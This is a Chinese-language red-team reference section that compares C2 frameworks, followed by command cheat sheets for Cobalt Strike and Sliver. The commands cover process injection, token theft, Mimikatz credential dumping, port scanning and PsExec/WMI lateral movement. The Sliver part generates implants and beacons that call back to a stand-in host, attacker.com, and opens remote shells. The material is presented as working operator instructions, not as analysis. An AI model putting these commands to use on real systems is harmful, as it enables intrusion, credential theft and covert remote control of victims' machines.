# C2 框架对比

### 15.1 主流 C2 框架详细对比

| 维度 | Cobalt Strike | Sliver | Havoc | Mythic |
|------|-------------|--------|-------|--------|
| 授权 | 商业授权 | 开源 | 开源 | 开源 |
| 语言 | Java/C++ | Go | C/C++ | 多语言 |
| 跨平台 | Windows为主 | 全平台 | Windows/Linux | 全平台 |
| 协议 | HTTP/HTTPS/DNS/TCP | HTTP/HTTPS/DNS/TCP | HTTP/HTTPS/SMB | 可扩展插件 |
| 免杀 | Malleable C2 | 自定义 | 自定义 | 取决于Agent |
| 后渗透 | Beacon功能全面 | 模块化 | 基础功能 | Agent决定 |
| 横向移动 | 内置PsExec/WMI等 | 内置 | 基础 | 取决于Agent |
| 部署 | 团队服务器+客户端 | 单一二进制 | 服务端+客户端 | Docker Compose |
| 价格 | ~$3500+/年 | 免费 | 免费 | 免费 |

### 15.2 Cobalt Strike 关键特性

```bash
# Beacon 管理命令
beacon> help
beacon> sleep 60              # 设置睡眠时间
beacon> sleep 60 10           # 睡眠60秒，抖动10秒
beacon> checkin               # 立即回连
beacon> mode dns              # 切换DNS通信
beacon> mode dns-txt          # DNS TXT记录通信
beacon> mode https            # HTTPS通信

# 后渗透命令
beacon> ps                    # 列出进程
beacon> psinject <pid> <x86|x64>  # 进程注入
beacon> steal_token <pid>     # 窃取进程令牌
beacon> getuid                 # 获取当前用户
beacon> runasuser domain\user password "command"  # 以其他用户运行
beacon> mimikatz sekurlsa::logonpasswords  # Mimikatz
beacon> portscan 10.0.0.0/24 445  # 端口扫描
beacon> psexec_psh 10.0.0.10  # PowerShell PsExec
beacon> wmi 10.0.0.10         # WMI横向
beacon> jump psexec 10.0.0.10  # PsExec横向
beacon> remote-exec 10.0.0.10  # 远程执行
```

### 15.3 Sliver 使用

```bash
# Sliver - 开源 C2 框架
# 安装
curl https://sliver.sh/install | sudo sh

# 生成 Implant
sliver > generate --http https://attacker.com --os windows --arch amd64

# 生成 Beacon
sliver > generate beacon --http https://attacker.com --os linux

# 管理会话
sliver > sessions                # 列出会话
sliver > use 1                   # 使用会话1
sliver (IMPLANT) > whoami        # 执行命令
sliver (IMPLANT) > ls            # 列出文件
sliver (IMPLANT) > procdump      # 进程转储
sliver (IMPLANT) > shell         # 获取Shell

# 通信协议切换
sliver (IMPLANT) > pivots        # 查看可用的 pivots
```
